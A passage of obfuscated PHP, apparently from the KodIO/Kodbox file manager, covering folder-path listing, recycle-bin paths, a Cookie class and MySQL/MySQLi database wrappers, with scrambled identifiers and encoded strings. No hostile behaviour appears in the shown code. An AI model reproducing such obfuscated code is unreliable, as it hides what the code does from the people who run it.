$‹Ö¿ºŸæ = array(); } foreach ($‹Ö¿ºŸæ as $ï¡¡’ÏÔ) { $†òıŠû [$ï¡¡’ÏÔ[$òâë©ÓŠ[193]]] = $ï¡¡’ÏÔ[$òâë©ÓŠ[32]]; } } $ÙÁÅÊê© = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÓÎ™ÄÓë = array(); foreach ($Ÿ•îÜš¨ as &$Ğ„˜èÇù) { $È¿ŞËšå = $Ğ„˜èÇù[$òâë©ÓŠ[588]]; $¶ìÅ’¯ = $òâë©ÓŠ[12]; if (isset($ÓÎ™ÄÓë[$È¿ŞËšå])) { $¶ìÅ’¯ = $ÓÎ™ÄÓë[$È¿ŞËšå]; } else { $‡Á¡Í‰ = $this->parentLevelArray($Ğ„˜èÇù[$òâë©ÓŠ[588]]); foreach ($‡Á¡Í‰ as $œüÙÇÜƒ => $Ì†û£™Š) { if (isset($†òıŠû [$Ì†û£™Š])) { $¶ìÅ’¯ .= $†òıŠû [$Ì†û£™Š] . $òâë©ÓŠ[8]; } } $ÓÎ™ÄÓë[$È¿ŞËšå] = $¶ìÅ’¯; } $¶ìÅ’¯ .= $Ğ„˜èÇù[$òâë©ÓŠ[32]]; if ($Ğ„˜èÇù[$òâë©ÓŠ[487]] == $òâë©ÓŠ[91]) { $¶ìÅ’¯ .= $òâë©ÓŠ[8]; } $Ğ„˜èÇù[$òâë©ÓŠ[586]] = str_replace($òâë©ÓŠ[256], $òâë©ÓŠ[8], $¶ìÅ’¯); if ($Ğ„˜èÇù[$òâë©ÓŠ[192]] == $òâë©ÓŠ[230]) { $Ğ„˜èÇù[$òâë©ÓŠ[32]] = trim($†òıŠû [$Ğ„˜èÇù[$òâë©ÓŠ[193]]], $òâë©ÓŠ[8]); $Ğ„˜èÇù[$òâë©ÓŠ[586]] = $Ğ„˜èÇù[$òâë©ÓŠ[32]] . $òâë©ÓŠ[8]; } if (intval($Ğ„˜èÇù[$òâë©ÓŠ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ğ„˜èÇù, $‡Á¡Í‰, $ÙÁÅÊê©); } } unset($Ğ„˜èÇù); return $Ÿ•îÜš¨; } private function _listAppendPathRecycle(&$Ÿß€ëò¥, $¼ˆÆŒãÙ, $æÕ¡‰¿) { $ £³É”¶ =& $_SERVER[°‰†òö¯]; if (!in_array($æÕ¡‰¿, $¼ˆÆŒãÙ) && $Ÿß€ëò¥[$ £³É”¶[193]] != $æÕ¡‰¿) { return; } $¦†…¡æâ = explode($ £³É”¶[8], trim($Ÿß€ëò¥[$ £³É”¶[586]], $ £³É”¶[8])); $ÎØ¨ø§ñ = implode($ £³É”¶[8], array_slice($¦†…¡æâ, 2)); $Ÿß€ëò¥[$ £³É”¶[586]] = $ £³É”¶[8] . LNG($ £³É”¶[596]) . $ £³É”¶[8] . ltrim($ÎØ¨ø§ñ, $ £³É”¶[8]); $Ÿß€ëò¥[$ £³É”¶[588]] = $ £³É”¶[597] . implode($ £³É”¶[50], array_slice($¼ˆÆŒãÙ, 1)) . $ £³É”¶[50]; if ($Ÿß€ëò¥[$ £³É”¶[193]] == $æÕ¡‰¿) { $Ÿß€ëò¥[$ £³É”¶[588]] = $ £³É”¶[597]; $Ÿß€ëò¥[$ £³É”¶[192]] = $ £³É”¶[230]; $Ÿß€ëò¥[$ £³É”¶[32]] = LNG($ £³É”¶[596]); } $Ÿß€ëò¥[$ £³É”¶[598]] = $ £³É”¶[599]; } protected function _listAppendPathRoot(&$é¯Â¨Óí, $Ÿ£‡Ôñœ) { $®¿‡„¦È =& $_SERVER[°‰†òö¯]; static $ÆÉÃğ“¥ = false; static $‹ÒÏ‹÷ô = false; $«¦ï­ó« = $®¿‡„¦È[12]; if ($é¯Â¨Óí[$®¿‡„¦È[190]] == self::TYPE_USER) { if ($é¯Â¨Óí[$®¿‡„¦È[573]] == USER_ID) { $«¦ï­ó« = LNG($®¿‡„¦È[600]); if ($ÆÉÃğ“¥ === !1) { $°­¬Ü¾ = Model($®¿‡„¦È[601])->getInfoFull(USER_ID); $ÆÉÃğ“¥ = _get($°­¬Ü¾, $®¿‡„¦È[602], $®¿‡„¦È[12]); } if ($‹ÒÏ‹÷ô === !1) { $°­¬Ü¾ = Model($®¿‡„¦È[601])->getInfoFull(USER_ID); $‹ÒÏ‹÷ô = _get($°­¬Ü¾, $®¿‡„¦È[603], $®¿‡„¦È[12]); } if ($Ÿ£‡Ôñœ && $Ÿ£‡Ôñœ[0] == $ÆÉÃğ“¥ || !$Ÿ£‡Ôñœ && $é¯Â¨Óí[$®¿‡„¦È[193]] == $ÆÉÃğ“¥) { $«¦ï­ó« = LNG($®¿‡„¦È[604]); $é¯Â¨Óí[$®¿‡„¦È[605]] = $®¿‡„¦È[606]; } if ($Ÿ£‡Ôñœ && $Ÿ£‡Ôñœ[0] == $‹ÒÏ‹÷ô || !$Ÿ£‡Ôñœ && $é¯Â¨Óí[$®¿‡„¦È[193]] == $‹ÒÏ‹÷ô) { $«¦ï­ó« = $«¦ï­ó« . $®¿‡„¦È[607] . LNG($®¿‡„¦È[608]); } if (!$Ÿ£‡Ôñœ) { $é¯Â¨Óí[$®¿‡„¦È[32]] = $«¦ï­ó«; } } else { $°­¬Ü¾ = Model($®¿‡„¦È[601])->getInfoFull($é¯Â¨Óí[$®¿‡„¦È[573]]); $ôìËÌıĞ = _get($°­¬Ü¾, $®¿‡„¦È[603], $®¿‡„¦È[12]); $é¯Â¨Óí[$®¿‡„¦È[609]] = Model($®¿‡„¦È[581])->getInfoSimpleOuter($é¯Â¨Óí[$®¿‡„¦È[573]]); $«¦ï­ó« = LNG($®¿‡„¦È[610]) . $®¿‡„¦È[176] . $é¯Â¨Óí[$®¿‡„¦È[609]][$®¿‡„¦È[32]] . $®¿‡„¦È[178]; if ($Ÿ£‡Ôñœ && $Ÿ£‡Ôñœ[0] == $ôìËÌıĞ || !$Ÿ£‡Ôñœ && $é¯Â¨Óí[$®¿‡„¦È[193]] == $ôìËÌıĞ) { $«¦ï­ó« = LNG($®¿‡„¦È[610]) . $®¿‡„¦È[611] . $é¯Â¨Óí[$®¿‡„¦È[609]][$®¿‡„¦È[32]] . $®¿‡„¦È[607] . LNG($®¿‡„¦È[608]) . $®¿‡„¦È[178]; } } } else { if ($é¯Â¨Óí[$®¿‡„¦È[190]] == self::TYPE_GROUP) { $ê”‹Ñ© = Model($®¿‡„¦È[589])->getInfoSimple($é¯Â¨Óí[$®¿‡„¦È[573]]); $«¦ï­ó« = $ê”‹Ñ©[$®¿‡„¦È[32]]; } else { if ($é¯Â¨Óí[$®¿‡„¦È[190]] == self::TYPE_SYSTEM) { $«¦ï­ó« = $®¿‡„¦È[612]; } } } $«¦ï­ó« = $«¦ï­ó« ? $®¿‡„¦È[8] . $«¦ï­ó« . $®¿‡„¦È[8] : $®¿‡„¦È[8]; return $«¦ï­ó«; } protected function _listAppendUser(&$¨§†Ï) { $½ÏÑÕ•Ø =& $_SERVER[°‰†òö¯]; $ÁåíèùÆ = array_to_keyvalue($¨§†Ï, $½ÏÑÕ•Ø[12], $½ÏÑÕ•Ø[529]); $ƒó¿®‹ = array_to_keyvalue($¨§†Ï, $½ÏÑÕ•Ø[12], $½ÏÑÕ•Ø[531]); $ÇÅØ¢ñ = array_merge($ÁåíèùÆ, $ƒó¿®‹); $ õ¹»‡Í = Model($½ÏÑÕ•Ø[601])->userListInfo($ÇÅØ¢ñ); foreach ($¨§†Ï as &$İ—ˆäıÁ) { $æÚÜñ€Ã = $İ—ˆäıÁ[$½ÏÑÕ•Ø[529]]; $İ—ˆäıÁ[$½ÏÑÕ•Ø[529]] = $ õ¹»‡Í[$æÚÜñ€Ã] ? $ õ¹»‡Í[$æÚÜñ€Ã] : !1; $æÚÜñ€Ã = $İ—ˆäıÁ[$½ÏÑÕ•Ø[531]]; $İ—ˆäıÁ[$½ÏÑÕ•Ø[531]] = $ õ¹»‡Í[$æÚÜñ€Ã] ? $ õ¹»‡Í[$æÚÜñ€Ã] : !1; if (_get($İ—ˆäıÁ, $½ÏÑÕ•Ø[613], 0)) { $—ˆ¸—òÙ = $GLOBALS[$½ÏÑÕ•Ø[6]][$½ÏÑÕ•Ø[92]][$½ÏÑÕ•Ø[614]]; if ($İ—ˆäıÁ[$½ÏÑÕ•Ø[543]][$½ÏÑÕ•Ø[615]] <= time() - $—ˆ¸—òÙ) { $this->metaSet($İ—ˆäıÁ[$½ÏÑÕ•Ø[193]], $½ÏÑÕ•Ø[616], null); $this->metaSet($İ—ˆäıÁ[$½ÏÑÕ•Ø[193]], $½ÏÑÕ•Ø[615], null); unset($İ—ˆäıÁ[$½ÏÑÕ•Ø[543]][$½ÏÑÕ•Ø[616]]); continue; } $Ù™¿Îö = $İ—ˆäıÁ[$½ÏÑÕ•Ø[543]][$½ÏÑÕ•Ø[616]]; $İ—ˆäıÁ[$½ÏÑÕ•Ø[543]][$½ÏÑÕ•Ø[617]] = Model($½ÏÑÕ•Ø[601])->getInfoSimpleOuter($Ù™¿Îö); } } unset($İ—ˆäıÁ); } public function parentLevelArray($è½ïğ„›) { $©£÷ñÜš =& $_SERVER[°‰†òö¯]; $è½ïğ„› = explode($©£÷ñÜš[50], trim($è½ïğ„›, $©£÷ñÜš[50])); return array_remove_value($è½ïğ„›, $©£÷ñÜš[230]); } public function listAll($Âá¾Ô®») { $•š‘‹ç =& $_SERVER[°‰†òö¯]; $ÕÚş®é = $this->sourceInfo($Âá¾Ô®»); $³¤üå“ = array($•š‘‹ç[618] => array($•š‘‹ç[619], $ÕÚş®é[$•š‘‹ç[588]] . $Âá¾Ô®» . $•š‘‹ç[620]), $•š‘‹ç[621] => 0); $û³ãÌÁƒ = $•š‘‹ç[622]; $’ÚÒ®³¶ = "\114\x45\x46\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x66\x69\x6c\145\40\x66\151\154\x65\40\157\156\x20\x73\157\x75\x72\x63\145\56\146\x69\x6c\x65\111\104\40\75\x20\146\x69\154\145\56\x66\151\x6c\145\111\104"; $ÍÍ›ú = $this->alias($•š‘‹ç[521])->field($û³ãÌÁƒ)->where($³¤üå“)->join($’ÚÒ®³¶)->select(); $this->_listAppendAuth($ÍÍ›ú); $this->_listAppendUser($ÍÍ›ú); $this->_listAppendPath($ÍÍ›ú); $ÍÍ›ú = array_to_keyvalue($ÍÍ›ú, $•š‘‹ç[193]); $šğ“å¬Ø = "\x2f{$ÕÚş®é[$•š‘‹ç[32]]}\57"; $šğ“å¬Ø = $šğ“å¬Ø == $•š‘‹ç[256] ? $•š‘‹ç[8] : $šğ“å¬Ø; $³ıÓ¾ã = array(); foreach ($ÍÍ›ú as $çîãÎÕ˜ => $ËŸ÷ğ¦Û) { $­„ˆ–Í = $this->parentLevelArray($ËŸ÷ğ¦Û[$•š‘‹ç[588]]); array_shift($­„ˆ–Í); $âæ—±¤Ÿ = $šğ“å¬Ø; for ($¾æ‡û¿ö = 0; $¾æ‡û¿ö < count($­„ˆ–Í); $¾æ‡û¿ö++) { $âæ—±¤Ÿ .= $ÍÍ›ú[$­„ˆ–Í[$¾æ‡û¿ö]][$•š‘‹ç[32]] . $•š‘‹ç[8]; } $âæ—±¤Ÿ .= $ËŸ÷ğ¦Û[$•š‘‹ç[32]]; if ($ËŸ÷ğ¦Û[$•š‘‹ç[487]]) { $âæ—±¤Ÿ .= $•š‘‹ç[8]; } $èçÇ¥¸ = array($•š‘‹ç[497] => str_replace($•š‘‹ç[256], $•š‘‹ç[8], str_replace($•š‘‹ç[256], $•š‘‹ç[8], str_replace($•š‘‹ç[256], $•š‘‹ç[8], $âæ—±¤Ÿ))), $•š‘‹ç[623] => intval($ËŸ÷ğ¦Û[$•š‘‹ç[487]]), $•š‘‹ç[624] => intval($ËŸ÷ğ¦Û[$•š‘‹ç[79]]), $•š‘‹ç[88] => intval($ËŸ÷ğ¦Û[$•š‘‹ç[88]]), $•š‘‹ç[90] => $this->pathInfoFilter($ËŸ÷ğ¦Û)); if (!$èçÇ¥¸[$•š‘‹ç[487]]) { $èçÇ¥¸[$•š‘‹ç[545]] = $ËŸ÷ğ¦Û[$•š‘‹ç[545]]; } $³ıÓ¾ã[] = $èçÇ¥¸; } $³ıÓ¾ã = array_sort_by($³ıÓ¾ã, $•š‘‹ç[87]); return $³ıÓ¾ã; } } goto ağñÙ—•Ñ©; dñ‘çÑæ¿…: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ãù‡êï = '', $˜ãÊ…®Š = 0) { if (is_string($Ãù‡êï) && $Ãù‡êï != $_SERVER[°‰†òö¯][12]) { $this->prefix = $Ãù‡êï; } if (is_numeric($˜ãÊ…®Š) && $˜ãÊ…®Š > 0) { $this->expire = $˜ãÊ…®Š; } } public static function getInstance() { static $ığ‰£ó‚; if ($ığ‰£ó‚ === null) { $ığ‰£ó‚ = new self(); } return $ığ‰£ó‚; } private static $cookieDisable = false; public static function disable($­¿ïƒÏÏ) { self::$cookieDisable = $­¿ïƒÏÏ; } private static $sameCookieSet = array(); public static function set($É¹’¤Ô, $†²‡¾, $‹Î¤ıñû = 0, $İˆØ£º = false, $„–ı†š = false) { $ï“ºà”è =& $_SERVER[°‰†òö¯]; if (self::$cookieDisable) { return; } if (!$‹Î¤ıñû) { $‹Î¤ıñû = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$É¹’¤Ô]) && self::$sameCookieSet[$É¹’¤Ô] == $†²‡¾ . $‹Î¤ıñû) { return; } self::$sameCookieSet[$É¹’¤Ô] = $†²‡¾ . $‹Î¤ıñû; if (!$„–ı†š) { $„–ı†š = str_replace(HOST, $ï“ºà”è[12], APP_HOST); $„–ı†š = _get($GLOBALS, $ï“ºà”è[956], $„–ı†š); } $•äò‘¶‚ = $ï“ºà”è[12]; setcookie($É¹’¤Ô, $†²‡¾, time() + $‹Î¤ıñû, $ï“ºà”è[8] . trim($„–ı†š, $ï“ºà”è[8]) . $•äò‘¶‚, !1, !1, $İˆØ£º); } public static function setSafe($êÉõ‰ıò, $¹ˆµáá—, $ñ¿Ä¢ºÇ = 0) { self::set($êÉõ‰ıò, $¹ˆµáá—, $ñ¿Ä¢ºÇ, !0); } public static function get($£¨…¼¤•) { static $Ò¥°×Ê = false; if (!$Ò¥°×Ê) { self::initHeaderCookie(); $Ò¥°×Ê = !0; } return isset($_COOKIE[$£¨…¼¤•]) ? $_COOKIE[$£¨…¼¤•] : !1; } private static function initHeaderCookie() { $ÙŒî·ğ =& $_SERVER[°‰†òö¯]; if (!isset($_SERVER[$ÙŒî·ğ[957]]) || !$_SERVER[$ÙŒî·ğ[957]]) { return; } $á¢¯ò˜Û = explode($ÙŒî·ğ[74], $_SERVER[$ÙŒî·ğ[957]]); foreach ($á¢¯ò˜Û as $ÂÓöˆ€ë) { $ÂÓöˆ€ë = explode($ÙŒî·ğ[508], $ÂÓöˆ€ë); if (count($ÂÓöˆ€ë) != 2 || !isset($ÂÓöˆ€ë[1])) { continue; } $_COOKIE[trim($ÂÓöˆ€ë[0])] = trim($ÂÓöˆ€ë[1]); } } public static function remove($ºŸ×Ëã, $çñ­º•Œ = false) { unset($_COOKIE[$ºŸ×Ëã]); self::set($ºŸ×Ëã, $_SERVER[°‰†òö¯][12], 1, $çñ­º•Œ); } } class DbMysql extends Db { public function __construct($–÷Œµ = '') { $Ïß‰âı =& $_SERVER[°‰†òö¯]; if (!extension_loaded($Ïß‰âı[869])) { think_exception(think_lang($Ïß‰âı[14]) . $Ïß‰âı[958]); } if (!empty($–÷Œµ)) { $this->config = $–÷Œµ; if (empty($this->config[$Ïß‰âı[17]])) { $this->config[$Ïß‰âı[17]] = $Ïß‰âı[12]; } } } public function connect($Óì‘„Ç½ = '', $¾¨Æş±Ì = 0, $’©…Ë» = false) { $®”ÜÀÑ =& $_SERVER[°‰†òö¯]; if (!isset($this->linkID[$¾¨Æş±Ì])) { if (empty($Óì‘„Ç½)) { $Óì‘„Ç½ = $this->config; } $Ê“ÔÉ‚È = $Óì‘„Ç½[$®”ÜÀÑ[959]] . ($Óì‘„Ç½[$®”ÜÀÑ[960]] ? "\72{$Óì‘„Ç½[$®”ÜÀÑ[960]]}" : $®”ÜÀÑ[12]); $İ¬¼ë’® = !empty($Óì‘„Ç½[$®”ÜÀÑ[17]][$®”ÜÀÑ[18]]) ? $Óì‘„Ç½[$®”ÜÀÑ[17]][$®”ÜÀÑ[18]] : $this->pconnect; if ($İ¬¼ë’®) { $this->linkID[$¾¨Æş±Ì] = mysql_pconnect($Ê“ÔÉ‚È, $Óì‘„Ç½[$®”ÜÀÑ[961]], $Óì‘„Ç½[$®”ÜÀÑ[962]], 131072); } else { $this->linkID[$¾¨Æş±Ì] = mysql_connect($Ê“ÔÉ‚È, $Óì‘„Ç½[$®”ÜÀÑ[961]], $Óì‘„Ç½[$®”ÜÀÑ[962]], !0, 131072); } if (!$this->linkID[$¾¨Æş±Ì] || !empty($Óì‘„Ç½[$®”ÜÀÑ[21]]) && !mysql_select_db($Óì‘„Ç½[$®”ÜÀÑ[21]], $this->linkID[$¾¨Æş±Ì])) { think_exception(mysql_error()); } $«˜¡§º‰ = mysql_get_server_info($this->linkID[$¾¨Æş±Ì]); mysql_query($®”ÜÀÑ[963] . think_config($®”ÜÀÑ[964]) . $®”ÜÀÑ[58], $this->linkID[$¾¨Æş±Ì]); if ($«˜¡§º‰ > $®”ÜÀÑ[965]) { mysql_query($®”ÜÀÑ[966], $this->linkID[$¾¨Æş±Ì]); } $this->connected = !0; if (1 != think_config($®”ÜÀÑ[22])) { unset($this->config); } } return $this->linkID[$¾¨Æş±Ì]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¿öÁĞ) { $­üÈ§»µ =& $_SERVER[°‰†òö¯]; if (0 === stripos($¿öÁĞ, $­üÈ§»µ[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¿öÁĞ; if ($this->queryID) { $this->free(); } think_action_status($­üÈ§»µ[23], 1); think_status($­üÈ§»µ[24]); $this->queryID = mysql_query($¿öÁĞ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ñ¤ º“) { $ƒŞÀ€”Ú =& $_SERVER[°‰†òö¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ñ¤ º“; if ($this->queryID) { $this->free(); } think_action_status($ƒŞÀ€”Ú[25], 1); think_status($ƒŞÀ€”Ú[24]); $´ó×Ñ•Â = mysql_query($Ñ¤ º“, $this->_linkID); $this->debug(); if (!1 === $´ó×Ñ•Â) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[°‰†òö¯][967], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ı›èÁä = mysql_query($_SERVER[°‰†òö¯][968], $this->_linkID); $this->transTimes = 0; if (!$ı›èÁä) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $˜±îã = mysql_query($_SERVER[°‰†òö¯][969], $this->_linkID); $this->transTimes = 0; if (!$˜±îã) { $this->error(); return !1; } } return !0; } private function getAll() { $»—¥áˆÚ = array(); if ($this->numRows > 0) { while ($›“°Ã„Ğ = mysql_fetch_assoc($this->queryID)) { $»—¥áˆÚ[] = $›“°Ã„Ğ; } mysql_data_seek($this->queryID, 0); } return $»—¥áˆÚ; } public function getFields($ÍâËŒ“) { $˜Õû¾³Í =& $_SERVER[°‰†òö¯]; $úÜë“äò = $this->query($˜Õû¾³Í[970] . $this->parseKey($ÍâËŒ“)); $ØÁëŞ—ë = array(); if ($úÜë“äò) { foreach ($úÜë“äò as $èÆ¿ä¿Ú => $ÓÉÏˆó•) { $ØÁëŞ—ë[$ÓÉÏˆó•[$˜Õû¾³Í[31]]] = array($˜Õû¾³Í[32] => $ÓÉÏˆó•[$˜Õû¾³Í[31]], $˜Õû¾³Í[33] => $ÓÉÏˆó•[$˜Õû¾³Í[34]], $˜Õû¾³Í[35] => (bool) (strtoupper($ÓÉÏˆó•[$˜Õû¾³Í[36]]) === $˜Õû¾³Í[971]), $˜Õû¾³Í[37] => $ÓÉÏˆó•[$˜Õû¾³Í[38]], $˜Õû¾³Í[39] => strtolower($ÓÉÏˆó•[$˜Õû¾³Í[40]]) == $˜Õû¾³Í[41], $˜Õû¾³Í[42] => strtolower($ÓÉÏˆó•[$˜Õû¾³Í[43]]) == $˜Õû¾³Í[44]); } } return $ØÁëŞ—ë; } public function getTables($Òƒ­Ëœ = '') { $ß£¶îÔ =& $_SERVER[°‰†òö¯]; if (!empty($Òƒ­Ëœ)) { $ÖôÃÑîä = $ß£¶îÔ[972] . $Òƒ­Ëœ . $ß£¶îÔ[973]; } else { $ÖôÃÑîä = $ß£¶îÔ[974]; } $ÔÈ¹Şœ“ = $this->query($ÖôÃÑîä); $–Šë®€ = array(); foreach ($ÔÈ¹Şœ“ as $£Š¹·‹œ => $ï‡ÜÈ—µ) { $–Šë®€[$£Š¹·‹œ] = current($ï‡ÜÈ—µ); } return $–Šë®€; } public function replace($ÏŞÊÚ‹¼, $’™ÃÒƒ = array()) { $÷ğ¥à¬ =& $_SERVER[°‰†òö¯]; foreach ($ÏŞÊÚ‹¼ as $›«´ì»— => $ÚŒ£‚Ö…) { $Ê²Øµ– = $this->parseValue($ÚŒ£‚Ö…); if (is_scalar($Ê²Øµ–)) { $Á‡ÁõÓ™[] = $Ê²Øµ–; $‡»ù¾¦[] = $this->parseKey($›«´ì»—); } } $¬¤¤Íäı = $÷ğ¥à¬[975] . $this->parseTable($’™ÃÒƒ[$÷ğ¥à¬[358]]) . $÷ğ¥à¬[976] . implode($÷ğ¥à¬[50], $‡»ù¾¦) . $÷ğ¥à¬[977] . implode($÷ğ¥à¬[50], $Á‡ÁõÓ™) . $÷ğ¥à¬[978]; return $this->execute($¬¤¤Íäı); } public function insertAll($ùƒ‚ó¿â, $„£ñ³ı¾ = array(), $êûºŞ’Ë = false) { $‹Ú›àØ =& $_SERVER[°‰†òö¯]; if (!is_array($ùƒ‚ó¿â[0])) { return !1; } $ºàèÑ“‡ = array_keys($ùƒ‚ó¿â[0]); $ŸÏ£ª›‡ = array(); foreach ($ùƒ‚ó¿â as $ „¼À±€) { $í†Í¾¤­ = array(); foreach ($ „¼À±€ as $ı·®ùÍö => $’ÃªãôÉ) { $’ÃªãôÉ = $this->parseValue($’ÃªãôÉ); if (is_scalar($’ÃªãôÉ)) { $í†Í¾¤­[] = $’ÃªãôÉ; } } $ŸÏ£ª›‡[] = $‹Ú›àØ[339] . implode($‹Ú›àØ[50], $í†Í¾¤­) . $‹Ú›àØ[978]; } array_walk($ºàèÑ“‡, array($this, $‹Ú›àØ[979])); $áá×äü· = ($êûºŞ’Ë ? $‹Ú›àØ[980] : $‹Ú›àØ[981]) . $‹Ú›àØ[982] . $this->parseTable($„£ñ³ı¾[$‹Ú›àØ[358]]) . $‹Ú›àØ[976] . implode($‹Ú›àØ[50], $ºàèÑ“‡) . $‹Ú›àØ[983] . implode($‹Ú›àØ[50], $ŸÏ£ª›‡); return $this->execute($áá×äü·); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $êÙùÀ‹ú =& $_SERVER[°‰†òö¯]; $this->error = mysql_errno() . $êÙùÀ‹ú[4] . mysql_error($this->_linkID); if ($êÙùÀ‹ú[12] != $this->queryStr) { $this->error .= LNG($êÙùÀ‹ú[48]) . $this->queryStr; } think_trace($this->error, $êÙùÀ‹ú[12], $êÙùÀ‹ú[49]); return $this->error; } public function escapeString($¨”§áû) { if ($this->_linkID) { return mysql_real_escape_string($¨”§áû, $this->_linkID); } else { return mysql_escape_string($¨”§áû); } } public function parseKey(&$†Ç×ªˆ´, $îÇ€ğ— = true) { $åÊƒ«•‘ =& $_SERVER[°‰†òö¯]; if ($îÇ€ğ—) { $†Ç×ªˆ´ = $this->parseKeyCheck($†Ç×ªˆ´); } if ($†Ç×ªˆ´ != $åÊƒ«•‘[222] && !preg_match($åÊƒ«•‘[984], $†Ç×ªˆ´)) { $†Ç×ªˆ´ = $åÊƒ«•‘[463] . trim($†Ç×ªˆ´, $åÊƒ«•‘[463]) . $åÊƒ«•‘[463]; } return $†Ç×ªˆ´; } } class DbMysqli extends Db { public function __construct($ÈĞäµ’ = '') { $Ê€³’’¤ =& $_SERVER[°‰†òö¯]; if (!extension_loaded($Ê€³’’¤[985])) { think_exception(think_lang($Ê€³’’¤[14]) . $Ê€³’’¤[986]); } if (!empty($ÈĞäµ’)) { $this->config = $ÈĞäµ’; if (empty($this->config[$Ê€³’’¤[17]])) { $this->config[$Ê€³’’¤[17]] = $Ê€³’’¤[12]; } } } public function connect($Ã£­ú² = '', $†õ«Ÿâ = 0) { $îêÉªÄ =& $_SERVER[°‰†òö¯]; if (!isset($this->linkID[$†õ«Ÿâ])) { if (empty($Ã£­ú²)) { $Ã£­ú² = $this->config; } $this->linkID[$†õ«Ÿâ] = new mysqli($Ã£­ú²[$îêÉªÄ[959]], $Ã£­ú²[$îêÉªÄ[961]], $Ã£­ú²[$îêÉªÄ[962]], $Ã£­ú²[$îêÉªÄ[21]], $Ã£­ú²[$îêÉªÄ[960]] ? intval($Ã£­ú²[$îêÉªÄ[960]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $†ò˜øè³ = $this->linkID[$†õ«Ÿâ]->server_version; $this->linkID[$†õ«Ÿâ]->query($îêÉªÄ[963] . think_config($îêÉªÄ[964]) . $îêÉªÄ[58]); if ($†ò˜øè³ > $îêÉªÄ[965]) { $this->linkID[$†õ«Ÿâ]->query($îêÉªÄ[966]); } $this->connected = !0; if (1 != think_config($îêÉªÄ[22])) { unset($this->config); } } return $this->linkID[$†õ«Ÿâ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ù¿øê­‘) { $ÁÆòıŞ =& $_SERVER[°‰†òö¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ù¿øê­‘; if ($this->queryID) { $this->free(); } think_action_status($ÁÆòıŞ[23], 1); think_status($ÁÆòıŞ[24]); $this->queryID = $this->_linkID->query($ù¿øê­‘); if ($this->_linkID->more_results()) { while (($§úóéÓ = $this->_linkID->next_result()) != NULL) { $§úóéÓ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ôğÔáÑä) { $ı¥Ø¥ø‰ =& $_SERVER[°‰†òö¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ôğÔáÑä; if ($this->queryID) { $this->free(); } think_action_status($ı¥Ø¥ø‰[25], 1); think_status($ı¥Ø¥ø‰[24]); $¦åÉ²îÚ = $this->_linkID->query($ôğÔáÑä); $this->debug(); if (!1 === $¦åÉ²îÚ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„ºê’— = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$„ºê’—) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $öƒ™¿›· = $this->_linkID->rollback(); $this->transTimes = 0; if (!$öƒ™¿›·) { $this->error(); return !1; } } return !0; } private function getAll() { $ÛëôËÀ = array(); if ($this->numRows > 0) { for ($½ÕğĞºÒ = 0; $½ÕğĞºÒ < $this->numRows; $½ÕğĞºÒ++) { $ÛëôËÀ[$½ÕğĞºÒ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÛëôËÀ; } public function getFields($°®•Ó) { $Çé´ëóä =& $_SERVER[°‰†òö¯]; $ØÙÆÎŒş = $this->query($Çé´ëóä[970] . $this->parseKey($°®•Ó)); $ĞÜ£¨û = array(); if ($ØÙÆÎŒş) { foreach ($ØÙÆÎŒş as $Úù„—•÷ => $å‡¥¶¹) { $ĞÜ£¨û[$å‡¥¶¹[$Çé´ëóä[31]]] = array($Çé´ëóä[32] => $å‡¥¶¹[$Çé´ëóä[31]], $Çé´ëóä[33] => $å‡¥¶¹[$Çé´ëóä[34]], $Çé´ëóä[35] => (bool) ($å‡¥¶¹[$Çé´ëóä[36]] === $Çé´ëóä[12]), $Çé´ëóä[37] => $å‡¥¶¹[$Çé´ëóä[38]], $Çé´ëóä[39] => strtolower($å‡¥¶¹[$Çé´ëóä[40]]) == $Çé´ëóä[41], $Çé´ëóä[42] => strtolower($å‡¥¶¹[$Çé´ëóä[43]]) == $Çé´ëóä[44]); } } return $ĞÜ£¨û; } public function getTables($Íáºã£½ = '') { $ƒ²è×¿³ =& $_SERVER[°‰†òö¯]; $Ñ‹¿‰â = !empty($Íáºã£½) ? $ƒ²è×¿³[972] . $Íáºã£½ . $ƒ²è×¿³[973] : $ƒ²è×¿³[974]; $³íúÍ¬ = $this->query($Ñ‹¿‰â); $áŠŞ×ÂÈ = array(); if ($³íúÍ¬) { foreach ($³íúÍ¬ as $ë°ù°Àµ => $ıô½§øŸ) { $áŠŞ×ÂÈ[$ë°ù°Àµ] = current($ıô½§øŸ); } } return $áŠŞ×ÂÈ; } public function replace($©ªıÇù, 